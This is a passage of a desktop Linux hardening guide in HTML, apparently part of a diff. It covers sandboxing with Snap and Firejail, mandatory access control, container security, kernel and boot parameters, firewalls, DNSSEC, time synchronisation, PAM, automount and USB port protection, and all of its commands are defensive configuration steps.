+<p>One caveat with Snap packages is that you only have control over the interfaces declared in their manifests. For example, Snap has separate interfaces for <code>audio-playback</code> and <code>audio-record</code>, but some packages will only declare the legacy <code>pulseaudio</code> interface which grants access to both play and record audio. Likewise, some applications may work perfectly fine with Wayland, but the package maintainer may only declare the X11 interface in their manifest. For these cases, you need to reach out to the maintainer of the snap to update the manifest accordingly.</p>
+<h3 id="firejail">Firejail</h3>
+<div class="youtube-embed-div">
+    <iframe src="https://www.youtube-nocookie.com/embed/N-Mso2bSr3o" class="youtube-embed-frame" allowfullscreen title="YouTube Video"></iframe>
+</div>  
+<p><a href="https://firejail.wordpress.com/">Firejail</a> is another method of sandboxing. As it is a large <a href="https://en.wikipedia.org/wiki/Setuid">setuid</a> binary, it has a large attack surface which increase susceptibility to <a href="https://en.wikipedia.org/wiki/Privilege_escalation">privilege escalation vulnerabilities</a>. <a href="https://madaidans-insecurities.github.io/linux.html#firejail">Madaidan offers additional details on how Firejail can worsen the security of your device.</a></p>
+<p>If you do use Firejail, <a href="https://github.com/netblue30/firetools">Firetools</a> can help to quickly manage application permissions and launch sandboxed applications. Note that Firetools configurations are temporary with no option to save profiles for long‑term use.</p>
+<p>Firejail can also confine X11 windows using Xpra or Xephr, something that Flatpak and Snap cannot do. I highly recommend checking out <a href="https://firejail.wordpress.com/documentation-2/x11-guide/">their documentation on X11 sandboxing</a>.</p>
+<p>One trick to launch applications with their Firejail profile is to use the <code>sudo firecfg</code> command. This will create a symlink <code>/usr/local/bin/app_name_here</code> pointing to Firejail, which will get used automatically by most .desktop files (which do not specify the absolute paths of their binaries) to use will launch the application through the symlink and have Firejail sandbox them this way. Of course, this is bypassable if you or some other applications launch the application directly from <code>/usr/bin/app_name_here</code> instead.</p>
+<h3 id="mandatory-access-control">Mandatory Access Control</h3>
+<p>Common Linux <a href="https://en.wikipedia.org/wiki/Mandatory_access_control">mandatory access control (MAC)</a> frameworks require policy files in order to force constraints on the system. The two most notable are <a href="https://github.com/SELinuxProject/selinux">SELinux</a> (used on Android and Fedora‑based distributions) and <a href="https://gitlab.com/apparmor/apparmor">AppArmor</a> (used on Debian‑based distributions and most openSUSE variants).</p>
+<p>Fedora includes SELinux preconfigured with some policies to confine system daemons (background processes). You should keep it in <em>enforcing</em> mode.</p>
+<p>openSUSE gives the choice of SELinux or AppArmor during the installation process. You should stick to the default for each variant (AppArmor for <a href="https://get.opensuse.org/tumbleweed/">Tumbleweed</a> and SELinux for <a href="https://microos.opensuse.org/">MicroOS</a>). openSUSE’s SELinux policies are derived from Fedora.</p>
+<p>Arch and its derivatives often do not come with a mandatory access control system, and you must manually install and configure <a href="https://wiki.archlinux.org/title/AppArmor">AppArmor</a>.</p>
+<p>Note that, unlike Android, traditional desktop Linux distributions typically do not have full system Mandatory Access Control policies; only a few system daemons are actually confined.</p>
+<h3 id="making-your-own-policiesprofiles">Making Your Own Policies/Profiles</h3>
+<p>You can make your own AppArmor profiles, SELinux policies, <a href="https://github.com/containers/bubblewrap">bubblewrap</a> profiles, and <a href="https://docs.kernel.org/userspace-api/seccomp_filter.html">seccomp</a> blacklist to have better confinement of applications. This is an advanced and sometimes tedious task, but there are various projects you could use as reference:</p>
+<ul>
+<li><a href="https://github.com/Kicksecure/apparmor-profile-everything">Kicksecure&rsquo;s apparmor-profile-everything</a></li>
+<li><a href="https://github.com/krathalan/apparmor-profiles">Krathalan’s AppArmor profiles</a></li>
+<li><a href="https://github.com/noatsecure/hardhat-selinux-templates">noatsecure’s SELinux templates</a></li>
+<li><a href="https://sr.ht/~seirdy/bwrap-scripts">Seirdy’s bubblewrap scripts</a></li>
+</ul>
+<h3 id="securing-linux-containers">Securing Linux Containers</h3>
+<p>If you’re running a server, you may have heard of containers. They are more common in server environments where individual services are built to operate independently. However, you may sometimes see them on desktop systems as well, especially for development purposes.</p>
+<p><a href="https://www.docker.com/">Docker</a> is one of the most popular container solutions. It does <strong>not</strong> offer a proper sandbox, meaning there is a large kernel attack surface. You should follow the <a href="/posts/linux/docker-and-oci-hardening/">Docker and OCI Hardening guide</a> to mitigate this problem. In short, there are things you can do like using rootless containers (via configuration changes or <a href="https://podman.io/">Podman</a>), using a runtime which provides a psuedo‑kernel for each container (<a href="https://gvisor.dev/">gVisor</a>), and so on.</p>
+<p>Another option is <a href="https://katacontainers.io/">Kata Containers</a> which masquerades virtual machines as containers. Each Kata container has its own kernel and is isolated from the host.</p>
+<h2 id="security-hardening">Security Hardening</h2>
+<p><img loading="lazy" src="/images/opensuse-computer.jpg" alt="opensuse-computer.jpg"  />
+</p>
+<h3 id="umask-077">Umask 077</h3>
+<p>On distributions besides openSUSE, consider changing the default <a href="https://wiki.archlinux.org/title/Umask">umask</a> for both root and regular users to <code>077</code> (symbolically, <code>u=rwx,g=,o=</code>). <em>On openSUSE, a umask of 077 can break snapper and is thus not recommended.</em></p>
+<p>The configuration for this varies per distribution, but typically it can be set in <code>/etc/profile</code>, <code>/etc/bashrc</code>, or <code>/etc/login.defs</code>.</p>
+<p>Note that, unlike on macOS, this will only change the umask for the shell. Files created by running applications will not have their permissions set to 600.</p>
+<h3 id="microcode-updates">Microcode Updates</h3>
+<p>You should make sure your system receives microcode updates to get fixes and mitigations for CPU vulnerabilities like <a href="https://meltdownattack.com/">Meltdown and Spectre</a>.</p>
+<p>Debian does not ship microcode updates by default, so be sure to <a href="https://wiki.debian.org/SourcesList">enable the non-free repository</a> and install the <code>microcode</code> package.</p>
+<p>On Arch Linux, make sure you have the <code>intel-ucode</code> or <code>amd-ucode</code> package installed.</p>
+<p>If you are looking to use the <a href="https://guix.gnu.org/en/download/">GNU Guix</a> distribution, you should absolutely use the <a href="https://gitlab.com/nonguix/nonguix">Nonguix channel</a> or similar to get microcode updates.</p>
+<p>Avoid the Linux-libre kernel at all costs, as they <a href="https://www.phoronix.com/news/GNU-Linux-Libre-5.13">actively block loading binary‑only microcode</a>.</p>
+<h3 id="firmware-updates">Firmware Updates</h3>
+<p>Many hardware vendors offer firmware updates to Linux systems through the <a href="https://fwupd.org/">Linux Vendor Firmware Service</a>. You can download and install updates using the following commands:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Update metadata</span>
+</span></span><span class="line"><span class="cl">fwupdmgr refresh
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Download and install firmware updates</span>
+</span></span><span class="line"><span class="cl">fwupdmgr update
+</span></span></code></pre></div><p>Some distributions like Debian do not have fwupd installed by default, so you should check for its existence on your system and install it if needed.</p>
+<p>Several graphical frontends integrate with fwupd to offer firmware updates (GNOME Software, KDE Discover, Snap Store, <a href="https://gitlab.gnome.org/World/gnome-firmware">GNOME Firmware</a>, Pop!_OS Settings app). However, not all distributions offer this integration by default, so you should check your specific system and setup scheduled updates or update notifications using <a href="https://wiki.archlinux.org/title/systemd/Timers">systemd timers</a> or <a href="https://wiki.archlinux.org/title/Cron">cron</a> if needed.</p>
+<p>Note that fwupd, like Windows Update, supports updating the UEFI. Power loss or forced shutdown in the middle of a UEFI update can brick your system, so unattended UEFI updating is not recommended unless you have the means to recover from a corrupted UEFI (motherboard flashback functionality or EEPROM flashing tools). fwupd UEFI updates can be disabled by adding <code>uefi_capsule</code> to <code>DisabledPlugins</code> in <code>/etc/fwupd/daemon.conf</code> and then restarting the fwupd daemon (<code>sudo systemctl restart fwupd</code>). <strong>Keeping your UEFI up‑to‑date is important for security patches, so make sure to periodically revert this setting and apply updates manually or install UEFI updates via other methods supported by some motherboards.</strong></p>
+<h3 id="firewall">Firewall</h3>
+<p>A <a href="https://en.wikipedia.org/wiki/Firewall_(computing)">firewall</a> may be used to secure connections to your system.</p>
+<p>Red Hat distributions (such as Fedora) and openSUSE typically use <a href="https://firewalld.org/">firewalld</a>. Red Hat maintains <a href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/8/html/configuring_and_managing_networking/using-and-configuring-firewalld_configuring-and-managing-networking">extensive documentation about firewalld and its graphical frontend firewall-config</a>.</p>
+<p>Distributions based on Debian or Ubuntu typically use the <a href="https://wiki.ubuntu.com/UncomplicatedFirewall">Uncomplicated Firewall (ufw)</a>. As the name suggests, it is much less sophisticated than firewalld. One notable missing feature is the ability to apply different firewall rules for different connections (see <em>zones</em> in firewalld).</p>
+<p>You could also set your default firewall zone to drop packets. To implement this with firewalld (with the necessary exceptions for IPv6):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">firewall-cmd --set-default-zone=drop
+</span></span><span class="line"><span class="cl">firewall-cmd --add-protocol=ipv6-icmp --permanent
+</span></span><span class="line"><span class="cl">firewall-cmd --add-service=dhcpv6-client --permanent
+</span></span></code></pre></div><p>These firewalls use the <a href="https://netfilter.org/">netfilter</a> framework and therefore cannot (without the help of strict <a href="#mandatory-access-control">mandatory access control</a>) protect against malicious software running privileged on the system, which can insert their own routing rules that sidestep firewalld/ufw.</p>
+<p>There are some per‑binary outbound firewalls such as <a href="https://github.com/evilsocket/opensnitch">OpenSnitch</a> and <a href="https://safing.io/portmaster/">Portmaster</a> that you could use as well. But, just like firewalld and ufw, they are bypassable.</p>
+<p>If you are using Flatpak packages, you can <a href="#flatpak">set an override to block network access</a>. This is not bypassable.</p>
+<p>If you are using non‑classic Snap packages on a system that <a href="#snap">supports proper confinement (both AppArmor and cgroups v1 present)</a>, you can use the Snap Store to revoke network permission. This is also not bypassable.</p>
+<h3 id="kernel-hardening">Kernel Hardening</h3>
+<p>There are several things you can do to harden the Linux kernel, including setting appropriate <a href="https://wiki.archlinux.org/title/Kernel_parameters">kernel parameters</a> and blacklisting unnecessary kernel modules.</p>
+<p><em>This section extensively references <a href="https://madaidans-insecurities.github.io/guides/linux-hardening.html">Madaidan&rsquo;s Linux Hardening Guide</a> and in the interest of brevity does not repeat all the information contained there. You are strongly encouraged to read through the relevant sections of Madaidan&rsquo;s guide (linked for convenience).</em></p>
+<h4 id="runtime-kernel-parameters-sysctl">Runtime Kernel Parameters (sysctl)</h4>
+<p><em>See <a href="https://madaidans-insecurities.github.io/guides/linux-hardening.html#sysctl">&ldquo;2.2 Sysctl&rdquo;</a> in Madaidan&rsquo;s guide.</em></p>
+<p>Madaidan recommends that you disable <a href="https://www.containerlabs.kubedaily.com/LXC/Linux%20Containers/User_namespaces.html">unprivileged user namespaces</a> due to the <a href="https://madaidans-insecurities.github.io/linux.html#kernel">significant attack surface for privilege escalation</a>. However, some software such as Podman and LXC relies on unprivileged user namespaces. If you wish to use such software, do not disable <code>kernel.unprivileged_userns_clone</code>.</p>
+<p>If you are using Kicksecure or Whonix, most of this hardening is included by default. If you are using Debian, you should consider <a href="https://www.kicksecure.com/wiki/Debian">morphing it into Kicksecure</a>. On other distributions, you can copy the <a href="https://github.com/Kicksecure/security-misc/tree/master/etc/sysctl.d">configuration files from Kicksecure</a> into <code>/etc/sysctl.d/</code> (but note that these configurations do not disable unprivileged user namespaces). There are also a few things in <code>30_security-misc.conf</code> to keep in mind:</p>
+<ul>
+<li>The <code>bluetooth</code> and <code>btusb</code> kernel modules are disabled. You need to comment out <code>install bluetooth /bin/disabled-bluetooth-by-security-misc</code> and <code>install btusb /bin/disabled-bluetooth-by-security-misc</code> to use Bluetooth.</li>
+<li>Apple filesystems are disabled. This is generally fine on non-Apple systems; however, if you are using an Apple device, you <strong>must</strong> check what filesystem your EFI partition uses. For example, if your EFI filesystem is HFS+, you need to comment out <code>install hfsplus /bin/disabled-filesys-by-security-misc</code>, otherwise your computer will not be able to boot Linux.</li>
+<li>The <code>cdrom</code> and <code>sr_mod</code> modules are merely <em>blacklisted</em> (can still be loaded at runtime with <code>modprobe</code>). If you have no intention to ever use CD‑ROM devices, they should be <em>disabled</em> by <em>un</em>commenting the respective <code>install</code> lines. (<a href="https://wiki.archlinux.org/title/Kernel_module#Using_files_in_/etc/modprobe.d/_2">More about how this works on the ArchWiki</a>)</li>
+<li>To produce informative errors when utilising the configuration file, all 10 of the corresponding <a href="https://github.com/Kicksecure/security-misc/tree/master/bin">debugging scripts</a> should be copied into <code>/bin/</code>.</li>
+</ul>
+<h4 id="boot-parameters">Boot Parameters</h4>
+<p><em>See <a href="https://madaidans-insecurities.github.io/guides/linux-hardening.html#boot-parameters">&ldquo;2.3 Boot parameters&rdquo;</a> in Madaidan&rsquo;s guide and <a href="https://github.com/Kicksecure/security-misc/tree/master/etc/default/grub.d">Kicksecure boot parameters</a>. If desired, <a href="https://www.kernel.org/doc/html/latest/admin-guide/kernel-parameters.html">formal documentation of boot parameters</a> is available upstream.</em></p>
+<p>Copy these parameters into <a href="https://wiki.archlinux.org/title/Kernel_parameters#Configuration">your bootloader&rsquo;s configuration</a>. On rpm‑ostree distributions, make sure to use <code>rpm-ostree kargs</code> rather than editing GRUB configuration directly.</p>
+<h5 id="cpu-mitigations">CPU mitigations</h5>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">spectre_v2=on spec_store_bypass_disable=on l1tf=full,force mds=full,nosmt tsx=off tsx_async_abort=full, mds=full,nosmt kvm.nx_huge_pages=force nosmt=force l1d_flush=on mmio_stale_data=full,nosmt
+</span></span></code></pre></div><p><a href="https://en.wikipedia.org/wiki/Simultaneous_multithreading">Simultaneous multithreading (SMT)</a> has been the cause of numerous hardware‑level vulnerabilities and is thus disabled here. If the option is available, you should disable SMT/&ldquo;Hyper‑Threading&rdquo; in your firmware as well.</p>
+<p>Note however that disabling SMT may have a significant performance impact &mdash; <a href="https://github.com/anthraxx/linux-hardened/issues/37#issuecomment-619597365">for this reason the popular linux‑hardened kernel for Arch does not disable SMT</a> by default. Assess your own risk tolerance, and, if you choose to keep SMT enabled, simply remove all occurrences of <code>nosmt</code> and <code>nosmt=force</code> from these parameters.</p>
+<h5 id="kernel">Kernel</h5>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">slab_nomerge init_on_alloc=1 init_on_free=1 pti=on vsyscall=none page_alloc.shuffle=1 randomize_kstack_offset=on extra_latent_entropy debugfs=off oops=panic quiet loglevel=0
+</span></span></code></pre></div><p>Kicksecure does not enforce either <code>module.sig_enforce=1</code> or <code>lockdown=confidentiality</code> by default as they lead to a lot of hardware compatibility issues; consider enabling these if possible on your system. Additionally, <a href="https://forums.whonix.org/t/kernel-hardening/7296/493"><code>mce=0</code> is no longer recommended</a>.</p>
+<h5 id="entropy-generation">Entropy generation</h5>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">random.trust_cpu=off random.trust_bootloader=off
+</span></span></code></pre></div><p>Some implementations of the RDRAND instruction (by which the CPU offers a random number generator to the OS) have proven to be <a href="https://en.wikipedia.org/wiki/RDRAND#Security_issues">vulnerable</a> or <a href="https://arstechnica.com/gadgets/2019/10/how-a-months-old-amd-microcode-bug-destroyed-my-weekend/">outright defective</a>. RDRAND is also impossible to audit, being part of the CPU itself.</p>
+<p>As a precaution for the integrity of cryptographic operations, the CPU and bootloader should not be used as <em>credited</em> entropy sources. Note that this change will increase boot time.</p>
+<p>Further reading:</p>
+<ul>
+<li><a href="https://systemd.io/RANDOM_SEEDS/">systemd: Random Seeds</a></li>
+<li><a href="https://madaidans-insecurities.github.io/guides/linux-hardening.html#rdrand">Madaidan: RDRAND</a></li>
+<li><a href="https://lore.kernel.org/lkml/20220605171539.417872-1-Jason@zx2c4.com/T/">Linux kernel mailing list</a></li>
+<li><a href="https://news.ycombinator.com/item?id=33223232">Hacker News discussion</a></li>
+<li><a href="https://github.com/NixOS/nixpkgs/pull/165355">NixOS discussion</a> (also cites many additional sources)</li>
+</ul>
+<h5 id="dma-mitigations">DMA mitigations</h5>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">intel_iommu=on amd_iommu=on efi=disable_early_pci_dma iommu.passthrough=0 iommu.strict=1
+</span></span></code></pre></div><p><a href="https://en.wikipedia.org/wiki/DMA_attack">Direct memory access (DMA) attacks</a> can be mitigated via IOMMU and <a href="#kernel-modules">disabling certain kernel modules</a>. Furthermore, <a href="https://github.com/Kicksecure/security-misc/blob/master/etc/default/grub.d/40_enable_iommu.cfg">strict enforcement of IOMMU TLB invalidation</a> should be applied so devices will never be able to access stale data contents.</p>
+<p><a href="https://github.com/PrivSec-dev/privsec.dev/pull/81#issuecomment-1367511126">These parameters <strong>do not provide comprehensive DMA protection</strong>.</a> In early boot (before the kernel has loaded), only the system firmware can enforce IOMMU and thus provide DMA protection. A DMA attack in early boot can patch the kernel in memory to completely undermine these parameters.</p>
+<p><em>Note that disabling the busmaster bit on all PCI bridges during very early boot (<code>efi=disable_early_pci_dma</code>) can cause complete boot failure on certain systems with inadequate resources. Therefore, as always, ensure you have a fallback option to boot into the system whenever modifying any kernel parameters.</em></p>
+<p>Further reading:</p>
+<ul>
+<li><a href="https://vfio.blogspot.com/2014/08/iommu-groups-inside-and-out.html">IOMMU Groups, inside and out</a></li>
+<li><a href="https://terenceli.github.io/%E6%8A%80%E6%9C%AF/2019/08/04/iommu-introduction">IOMMU introduction</a></li>
+<li><a href="https://terenceli.github.io/%E6%8A%80%E6%9C%AF/2019/08/10/iommu-driver-analysis">intel IOMMU driver analysis</a></li>
+<li><a href="https://mjg59.dreamwidth.org/54433.html">Avoiding gaps in IOMMU protection at boot</a></li>
+<li><a href="https://madaidans-insecurities.github.io/guides/linux-hardening.html#dma-attacks">Madaidan: DMA attacks</a></li>
+</ul>
+<h4 id="kernel-modules">Kernel Modules</h4>
+<p><em>See <a href="https://madaidans-insecurities.github.io/guides/linux-hardening.html#kasr-kernel-modules">&ldquo;2.5.2 Blacklisting kernel modules&rdquo;</a> in Madaidan&rsquo;s guide.</em></p>
+<p>Once again, Kicksecure includes this hardening by default and provides a config file which can be used on other distros: <a href="https://github.com/Kicksecure/security-misc/blob/master/etc/modprobe.d/30_security-misc.conf"><code>/etc/modprobe.d/30_security-misc.conf</code></a></p>
+<p>There are a few things in this config to keep in mind:</p>
+<ul>
+<li>Bluetooth is disabled. Comment out the <code>install bluetooth</code> and <code>install btusb</code> lines to use Bluetooth.</li>
+<li>Thunderbolt is disabled. Comment out the <code>install thunderbolt</code> line to use Thunderbolt devices.</li>
+<li>Apple filesystems are disabled. While generally fine on non‑Apple systems, if you are using an Apple device you <strong>must</strong> check the filesystem of your EFI partition and comment out the relevant <code>install</code> line, otherwise your Linux install will not boot. For example, comment out the <code>install hfsplus</code> line if your ESP filesystem is HFS+.</li>
+</ul>
+<h4 id="restricting-access-to-proc-and-sys">Restricting access to /proc and /sys</h4>
+<p><em>See <a href="https://madaidans-insecurities.github.io/guides/linux-hardening.html#hidepid">&ldquo;2.4 hidepid&rdquo;</a> and <a href="https://madaidans-insecurities.github.io/guides/linux-hardening.html#restricting-sysfs">&ldquo;2.7 Restricting access to sysfs&rdquo;</a> in Madaidan&rsquo;s guide.</em></p>
+<p>Disabling access to <code>/sys</code> without a proper whitelist will lead to various applications breaking. Developing such a whitelist will unfortunately be extremely tedious for most users. Kicksecure, and by extension Whonix, has the experimental <a href="https://github.com/Kicksecure/security-misc/blob/master/lib/systemd/system/proc-hidepid.service">proc-hidepid</a> and <a href="https://github.com/Kicksecure/security-misc/blob/master/lib/systemd/system/hide-hardware-info.service">hide-hardware-info</a> services which do just this. From my testing, these work perfectly fine on minimal Kicksecure installations and both Qubes-Whonix-Workstation and Qubes-Whonix-Gateway.</p>
+<h4 id="linux-hardened">linux-hardened</h4>
+<p>Some distributions like Arch Linux offer the <a href="https://github.com/anthraxx/linux-hardened">linux‑hardened</a> kernel package. It includes <a href="https://wiki.archlinux.org/title/security#Kernel_hardening">hardening patches</a> and more security-conscious defaults.</p>
+<p>linux‑hardened has unprivileged user namespaces (<code>kernel.unprivileged_userns_clone</code>) disabled by default. <a href="#runtime-kernel-parameters-sysctl">This may impact some software.</a></p>
+<h4 id="linux-kernel-runtime-guard-lkrg">Linux Kernel Runtime Guard (LKRG)</h4>
+<p>LKRG is a kernel module which self‑describes as a runtime kernel integrity checker and exploit detector:</p>
+<blockquote>
+<p>As controversial as this concept is, LKRG attempts to <em>post</em>‑detect and <em>hopefully</em> promptly respond to unauthorized modifications to the running Linux kernel (integrity checking) or to credentials such as user IDs of the running processes (exploit detection). For process credentials, LKRG attempts to detect the exploit and take action before the kernel would grant access (such as open a file) based on the unauthorized credentials.</p>
+<p>LKRG defeats many pre-existing exploits of Linux kernel vulnerabilities, and will likely defeat many future exploits (including of yet unknown vulnerabilities) that do not specifically attempt to bypass LKRG. While LKRG is <em>bypassable by design</em>, such bypasses tend to require more complicated and/or less reliable exploits.</p>
+</blockquote>
+<p><em>(From <a href="https://lkrg.org">LKRG - Linux Kernel Runtime Guard</a>.)</em></p>
+<p>If you can get LKRG and maintain module updates, it provides a worthwhile improvement to security.</p>
+<p>Debian-based distributions can get the LKRG DKMS package <a href="https://www.kicksecure.com/wiki/Linux_Kernel_Runtime_Guard_LKRG">from Kicksecure</a>, though Kicksecure does not install it by default. Packaging for Fedora is available through a <a href="https://copr.fedorainfracloud.org/coprs/fepitre/lkrg/">Copr repository</a> maintained by Qubes OS developer fepitre. Arch users can obtain the LKRG DKMS package <a href="https://aur.archlinux.org/packages/lkrg-dkms">from the AUR</a>.</p>
+<h4 id="grsecurity">grsecurity</h4>
+<p><a href="https://grsecurity.net/">Grsecurity</a> offers a set of kernel patches that attempt to improve security of the Linux kernel. Payment is required, but grsecurity is worth using if you have a subscription.</p>
+<h3 id="hardened-memory-allocator">Hardened Memory Allocator</h3>
+<p>The <a href="https://github.com/GrapheneOS/hardened_malloc">hardened memory allocator (hardened_malloc)</a> from GrapheneOS can be used on general Linux distributions, though <a href="https://www.kicksecure.com/wiki/Hardened_Malloc">only for some programs</a>.</p>
+<p>Kicksecure installs it by default (though not enabled by default) and provides <a href="https://www.kicksecure.com/wiki/Hardened_Malloc">in‑depth usage instructions</a> relevant to all distributions. On Arch-based systems, hardened_malloc is <a href="https://wiki.archlinux.org/title/Security#Hardened_malloc">available through the AUR</a>. Divested Computing Group maintains a <a href="https://github.com/divestedcg/rpm-hardened_malloc">Fedora build</a>.</p>
+<h3 id="mountpoint-hardening">Mountpoint Hardening</h3>
+<p>Consider adding the <a href="https://man7.org/linux/man-pages/man8/mount.8.html#FILESYSTEM-INDEPENDENT_MOUNT_OPTIONS">mount options</a> <code>nodev</code>, <code>noexec</code>, and <code>nosuid</code> to mountpoints which do not need the respective capabilities. Typically, these can be applied to <code>/boot</code>, <code>/boot/efi</code>, and <code>/var</code>. These flags could also be applied to <code>/home</code> and <code>/root</code>, however <code>noexec</code> will prevent applications that require binary execution in those locations from working (including Flatpak and Snap).</p>
+<p>It should be noted that <code>noexec</code> is not foolproof and actually <a href="https://chromium.googlesource.com/chromiumos/docs/+/HEAD/security/noexec_shell_scripts.md#what-about-interpreted-code">quite easy to bypass</a>.</p>
+<p>If you use <a href="https://docs.fedoraproject.org/en-US/fedora-silverblue/toolbox/">Toolbox</a>, do not set any of these mount options on <code>/var/log/journal</code>. From my testing, the Toolbox container will fail to start if you have <code>nodev</code>, <code>nosuid</code>, or <code>noexec</code> on said directory. If you are on Arch Linux, you probably do not want to set <code>noexec</code> on <code>/var/tmp</code>, as some AUR packages will then fail to build.</p>
+<h3 id="disabling-suid">Disabling SUID</h3>
+<p>SUID allows a user to execute an application as the owner of that application, which in many cases is the <code>root</code> user. Vulnerable SUID executables could lead to privilege escalation vulnerabilities.</p>
+<p>It is desirable to remove SUID from as many binaries as possible; however, this takes substantial effort and trial and error on the user&rsquo;s part, as some applications require SUID to function.</p>
+<p>Kicksecure, and by extension Whonix, has an experimental <a href="https://github.com/Kicksecure/security-misc/blob/master/lib/systemd/system/permission-hardening.service">permission hardening service</a> and <a href="https://github.com/Kicksecure/security-misc/tree/master/etc/permission-hardening.d">application whitelist</a> to automate SUID removal from most binaries and libraries on the system. From my testing, these work perfectly fine on minimal Kicksecure installations and both Qubes-Whonix-Workstation and Qubes-Whonix-Gateway.</p>
+<h3 id="dnssec">DNSSEC</h3>
+<p>Most Linux distributions do not enable <a href="https://www.icann.org/resources/pages/dnssec-what-is-it-why-important-2019-03-05-en">DNSSEC</a> by default. I recommend that you enable it to make sure that the responses to your DNS queries are authentic. You will need a DNS provider that supports DNSSEC. Ideally, you should use a VPN which provides this feature with its DNS servers so that you can also blend in with other people.</p>
+<p>On systems with <code>systemd-resolved</code>, you can edit the <code>/etc/systemd/resolved.conf</code> file and add <code>DNSSEC=yes</code> to enable it. Do <code>systemctl restart systemd-resolved</code> after you are done editing to apply your configuration.</p>
+<p>If you are a Whonix or Tails user, you can disregard setting up DNSSEC, as Tor DNS resolution does not support it. Alternatively, you can <a href="https://www.whonix.org/wiki/Alternative_DNS_Resolver">use a non-Tor resolver</a>, though it is not recommended that you do this for an extended amount of time.</p>
+<h3 id="time-synchronization">Time Synchronization</h3>
+<p>Most Linux distributions by default use the unencrypted and unauthenticated <a href="https://en.wikipedia.org/wiki/Network_Time_Protocol">Network Time Protocol (NTP)</a> for time synchronization. There are two ways to easily solve this problem:</p>
+<ul>
+<li><a href="https://fedoramagazine.org/secure-ntp-with-nts/">Configure Network Time Security (NTS) with chronyd</a></li>
+<li>Use Kicksecure&rsquo;s <a href="https://github.com/Kicksecure/sdwdate">sdwdate</a> on Debian‑based distributions.</li>
+</ul>
+<p>If decide on using NTS with chronyd, consider using multiple, independent time providers and setting <a href="https://chrony.tuxfamily.org/doc/devel/chrony.conf#minsources"><code>minsources</code></a> greater than 1.</p>
+<p>GrapheneOS uses a <a href="https://github.com/GrapheneOS/infrastructure/blob/main/chrony.conf">quite nice chrony configuration</a> for their infrastructure. I recommend that you replicate their <code>chrony.conf</code> on your system.</p>
+<h3 id="pluggable-authentication-modules-pam">Pluggable Authentication Modules (PAM)</h3>
+<p><a href="https://wiki.archlinux.org/title/PAM">PAM</a>&rsquo;s <a href="https://madaidans-insecurities.github.io/guides/linux-hardening.html#pam">settings can be hardened</a> to improve authentication security (though keep in mind the bypassable nature of PAM as opposed to encryption).</p>
+<p>On Red Hat distributions, you can use <a href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/8/html/configuring_authentication_and_authorization_in_rhel/configuring-user-authentication-using-authselect_configuring-authentication-and-authorization-in-rhel">authselect</a> to configure this, e.g.:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo authselect select &lt;profile_id, default: sssd&gt; with-faillock without-nullok with-pamaccess
+</span></span></code></pre></div><p>On systems where <code>pam_faillock</code> is not available, consider using <a href="https://www.man7.org/linux/man-pages/man8/pam_tally2.8.html"><code>pam_tally2</code></a> instead.</p>
+<p>If you have a YubiKey or other U2F/FIDO2 authenticator, you can use <a href="https://github.com/Yubico/pam-u2f">pam-u2f</a> to implement two‑factor authentication for login. <strong>Make sure to use a hardcoded <code>origin</code> and <code>appid</code> as <a href="https://wiki.archlinux.org/title/Universal_2nd_Factor#Authentication_for_Arch_Linux">indicated in the ArchWiki</a>. Do not use the default identifier <code>pam://$HOSTNAME</code> which will break if your hostname changes.</strong></p>
+<h3 id="storage-media-handling">Storage Media Handling</h3>
+<p>Some Linux distributions and desktop environments automatically mount arbitary filesystems upon storage media insertion. This is a security risk, as an adversary can attach a malicious storage device to your computer to exploit vulnerable filesystem drivers.</p>
+<p><em>This behavior is disabled by default on Whonix.</em></p>
+<h4 id="udisks">UDisks</h4>
+<p>GNOME users on systems with UDisks can mitigate this risk by running the following commands:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;[org/gnome/desktop/media-handling]
+</span></span></span><span class="line"><span class="cl"><span class="s1">automount=false
+</span></span></span><span class="line"><span class="cl"><span class="s1">automount-open=false&#39;</span> <span class="p">|</span> sudo tee /etc/dconf/db/local.d/automount-disable
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;org/gnome/desktop/media-handling/automount
+</span></span></span><span class="line"><span class="cl"><span class="s1">org/gnome/desktop/media-handling/automount-open&#39;</span> <span class="p">|</span> sudo tee /etc/dconf/db/local.d/locks/automount-disable
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">sudo dconf update
+</span></span></code></pre></div><p>This will disable automounting and prevent users from overriding that setting (without privileges).</p>
+<p><em>Cinnamon uses the same configuration/commands except with <code>cinnamon</code> substituted in place of <code>gnome</code>. Other desktop environments based on GNOME 3 likely follow a similar pattern &mdash; use <code>gsettings</code> to investigate.</em></p>
+<h4 id="autofs">autofs</h4>
+<p>On older systems where <code>autofs</code> is used, you should mask the <code>autofs</code> service to disable this behavior.</p>
+<h3 id="usb-port-protection">USB Port Protection</h3>
+<p>To better protect your USB ports from attacks such as <a href="https://www.srlabs.de/bites/usb-peripherals-turn">BadUSB</a> and the infamous <a href="https://hak5.org/products/usb-rubber-ducky">Hak5 USB Rubber Ducky</a>, I recommend <a href="https://usbguard.github.io">USBGuard</a>. Documentation is available on the <a href="https://usbguard.github.io">USBGuard website</a> and <a href="https://wiki.archlinux.org/title/USBGuard">ArchWiki</a>.</p>
